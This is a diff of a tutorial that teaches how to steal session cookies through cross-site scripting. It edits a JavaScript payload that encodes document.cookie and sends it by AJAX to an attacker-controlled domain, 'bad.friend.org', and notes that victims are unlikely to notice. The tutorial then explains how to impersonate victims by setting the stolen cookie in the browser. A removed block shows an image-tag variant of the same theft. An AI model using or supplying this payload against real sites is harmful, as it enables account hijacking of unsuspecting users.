@@ -17,18 +17,13 @@ First, you must create an entry point on the vulnerable website with cross-site 
 
 ## JavaScript Injection
 
-For the code snippet below, we assume your server is accessible at the domain `bad.friend.org`.
+For the code snippet below, we assume your server is accessible at the domain `bad.friend.org`. This is an example of an **AJAX** request, which is unlikely to be noticed by victims.
 
 {% highlight javascript linenos %}
 
 let yourCookie = encodeURI(document.cookie);
-
-// retrieve an image from the server, but send the victim's cookies as well.
-let url = `http://bad.friend.org/picture.jpg?$yourCookies={yourCookie}`;
-document.getElementsByTagName('image')[0].src = url;
-
-// AJAX - Unnoticed by the typical user, low-profile payload
 url = `http://bad.friend.org/gimmie?yourCookies=${yourCookie}`;
+
 let xhr = new XMLHttpRequest();
 xhr.open('GET', url, true);
 xhr.send();
@@ -55,3 +50,8 @@ http.createServer((req, res) => {
 {% endhighlight %}
 
 You can impersonate victims by spoofing their unique cookie. The Chrome extension [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg) is easy to use.
+
+## Alternative Approaches
+
+Your situation might constrain the available options. More examples are available on [Github](https://github.com/twlinux/lets-talk/tree/master/examples).
+
